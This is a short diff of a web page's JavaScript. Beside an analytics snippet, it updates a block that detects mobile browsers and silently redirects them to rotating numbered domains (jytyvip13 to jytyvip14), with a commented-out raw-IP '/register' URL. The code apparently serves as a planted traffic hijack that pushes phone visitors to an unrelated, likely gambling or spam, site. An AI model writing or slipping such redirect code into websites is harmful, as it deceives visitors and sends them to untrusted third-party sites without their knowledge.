@@ -7,7 +7,7 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	var arr = ["https://www.jytyvip13.com", "https://www.jytyvip13.com"];
+	var arr = ["https://jytyvip14.com", "https://jytyvip14.com"];
 	//var arr = ["https://35.194.228.102:11573/register", "https://35.194.228.102:11573/register"];
 	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
